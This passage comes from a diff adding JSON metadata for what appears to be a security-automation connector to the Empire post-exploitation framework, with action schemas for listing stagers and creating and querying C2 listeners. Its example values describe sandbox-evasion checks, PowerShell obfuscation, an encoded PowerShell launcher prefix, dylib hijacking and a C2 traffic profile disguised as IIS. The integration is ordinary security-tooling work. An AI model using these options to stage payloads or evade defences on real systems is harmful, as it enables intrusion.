+                    "data_path": "action_result.data.*.stagers.*.options.OutFile.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Language.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Language.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Language of the stager to generate."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Language.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "python"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.SafeChecks.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.SafeChecks.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.SafeChecks.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.UserAgent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.UserAgent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "User-agent string to use for the staging request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.UserAgent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.total_stagers",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "list payloads",
+            "identifier": "list_stagers",
+            "description": "List all current stagers",
+            "verbose": "List all the stagers available in Empire.",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {},
+            "output": [
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Total stagers: 26"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Name",
+                    "data_type": "string",
+                    "column_name": "Stager Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "osx/jar"
+                    ],
+                    "contains": [
+                        "empire stager name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Author",
+                    "data_type": "string",
+                    "example_values": [
+                        "@herman"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Description",
+                    "data_type": "string",
+                    "column_name": "Description",
+                    "column_order": 1,
+                    "example_values": [
+                        "Generates a JAR file."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Comments",
+                    "data_type": "string",
+                    "example_values": [
+                        "A herman comment"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Listener.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Listener.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Listener to generate stager for."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Listener.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutFile.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutFile.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "File to output duckyscript to."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutFile.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "/tmp/out.jar"
+                    ],
+                    "contains": [
+                        "file name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Language.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Language.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Language of the stager to generate."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Language.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "python"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.SafeChecks.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.SafeChecks.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.SafeChecks.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.UserAgent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.UserAgent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "User-agent string to use for the staging request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.UserAgent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Hijacker.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Hijacker.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Generate dylib to be used in a Dylib Hijack. This provides a dylib with the LC_REEXPORT_DYLIB load command. The path will serve as a placeholder."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Hijacker.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "False"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Architecture.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Architecture.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Architecture: x86/x64"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Architecture.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "x86"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.ProxyCreds.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.ProxyCreds.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.ProxyCreds.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.StagerRetries.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.StagerRetries.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Times for the stager to retry connecting."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.StagerRetries.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "0"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Proxy.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Proxy.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Proxy.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Keyboard.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Keyboard.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Use a different layout then EN. Add a Q SET_LANGUAGE stanza for various keymaps, try DE, HR..."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Keyboard.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Interpreter.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Interpreter.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Interpreter for code (Defaults to powershell, since a lot of places block cmd.exe)"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Interpreter.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.AppName.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.AppName.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Name for the .war/.jsp. Defaults to listener name."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.AppName.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Obfuscate.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Obfuscate.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Obfuscate.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "False"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.ObfuscateCommand.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.ObfuscateCommand.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.ObfuscateCommand.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Token\\All\\1,Launcher\\STDIN++\\1234567"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.MinPSVersion",
+                    "data_type": "string",
+                    "example_values": [
+                        "2"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.OpsecSafe",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Background",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Base64.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Base64.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Base64 encode the output."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Base64.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.PowershellPath.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.PowershellPath.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Path to powershell.exe"
+                    ],
+                    "contains": [
+                        "file name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.PowershellPath.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "C:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe"
+                    ],
+                    "contains": [
+                        "file path",
+                        "file name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.LNKComment.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.LNKComment.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "LNK Comment."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.LNKComment.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Icon.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Icon.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Path to LNK icon."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Icon.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "C:\\program files\\windows nt\\accessories\\wordpad.exe"
+                    ],
+                    "contains": [
+                        "file path",
+                        "file name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.AppIcon.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.AppIcon.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Path to AppIcon.icns file. The size should be 16x16,32x32,128x128, or 256x256. Defaults to none."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.AppIcon.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Delete.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Delete.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Delete .bat after running."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Delete.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.BinaryFile.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.BinaryFile.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "File to output launcher to."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.BinaryFile.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "/tmp/empire"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Arch.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Arch.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Architecture of the .dll to generate (x64 or x86)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Arch.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "x64"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputPath.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputPath.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Output path for the files."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputPath.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "/tmp/"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputPs1.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputPs1.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "PS1 file to execute against the target."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputPs1.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default.ps1"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.HostURL.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.HostURL.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "IP address to host the malicious ps1 file."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.HostURL.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "http://192.168.1.1:80"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputDocx.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputDocx.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "MSOffice document name."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutputDocx.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "empire.docx"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.total_stagers",
+                    "data_type": "numeric",
+                    "example_values": [
+                        26
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "get server options",
+            "identifier": "get_listener_options",
+            "description": "Get a list of options for a specified listener type",
+            "verbose": "",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {
+                "listener_type": {
+                    "description": "Listener Type for which to get options",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire listener type"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.listener_type",
+                    "data_type": "string",
+                    "example_values": [
+                        "dbx",
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener type"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Listener found: True"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.listener_found",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.Required",
+                    "data_type": "boolean",
+                    "column_name": "Required",
+                    "column_order": 1,
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.Name",
+                    "data_type": "string",
+                    "column_name": "Option Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "StagerURI"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.Value",
+                    "data_type": "string",
+                    "column_name": "Current Value",
+                    "column_order": 2,
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.Description",
+                    "data_type": "string",
+                    "column_name": "Description",
+                    "column_order": 3,
+                    "example_values": [
+                        "URI for the stager. Must use /download/. Example: /download/stager.php"
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "create server",
+            "identifier": "create_listener",
+            "description": "Create a new listener",
+            "verbose": "Create a listener in Empire.",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "listener_type": {
+                    "description": "Type of Listener to create",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": false,
+                    "contains": [
+                        "empire listener type"
+                    ],
+                    "value_list": [
+                        "dbx",
+                        "http",
+                        "http_com",
+                        "http_foreign",
+                        "http_hop",
+                        "http_mapi",
+                        "meterpreter"
+                    ],
+                    "default": "http",
+                    "order": 0
+                },
+                "listener_name": {
+                    "description": "Name for listener",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": false,
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 1
+                },
+                "options": {
+                    "description": "JSON options for a listener - see output of get server options for examples",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": false,
+                    "value_list": [],
+                    "default": "",
+                    "order": 2
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.listener_type",
+                    "data_type": "string",
+                    "contains": [
+                        "empire listener type"
+                    ],
+                    "column_name": "Listener Type",
+                    "column_order": 0,
+                    "example_values": [
+                        "http_mapi"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.listener_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "column_name": "Listener Name",
+                    "column_order": 1,
+                    "example_values": [
+                        "bob_test"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.options",
+                    "data_type": "string",
+                    "column_name": "Options",
+                    "column_order": 2,
+                    "example_values": [
+                        "{\"Port\": \"9090\"}"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 3,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Success: listener bob_test successfully started"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.success",
+                    "data_type": "string",
+                    "example_values": [
+                        "listener bob_test successfully started"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.success",
+                    "data_type": "string",
+                    "example_values": [
+                        "listener bob_test successfully started"
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "get server",
+            "identifier": "get_listener",
+            "description": "Get a listener by name",
+            "verbose": "Returns the listener specified by the name.",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {
+                "listener_name": {
+                    "description": "Listener Name",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.listener_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "column_name": "Listener Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "http"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 1,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Listener module: http, Listener type: None"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.name",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.listener_category",
+                    "data_type": "string",
+                    "example_values": [
+                        "client_server"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.module",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener type"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.ID",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagerURI.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagerURI.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "URI for the stager. Must use /download/. Example: /download/stager.php"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.StagerURI.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ProxyCreds.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ProxyCreds.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ProxyCreds.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.KillDate.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.KillDate.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Date for the listener to exit (MM/dd/yyyy)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.KillDate.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Name.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Name.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Name for the listener."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Name.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Launcher.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Launcher.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Launcher string."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Launcher.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell -noP -sta -w 1 -enc "
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultProfile.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultProfile.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Default communication profile for the agent."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.DefaultProfile.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ServerVersion.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ServerVersion.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Server header for the control server."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.ServerVersion.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Microsoft-IIS/7.5"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Host.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Host.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Hostname/IP for staging."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Host.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "http://172.16.25.158:8080"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Port.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.listeners.*.options.Port.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Port for the listener."
+                    ]
+                },
+                {
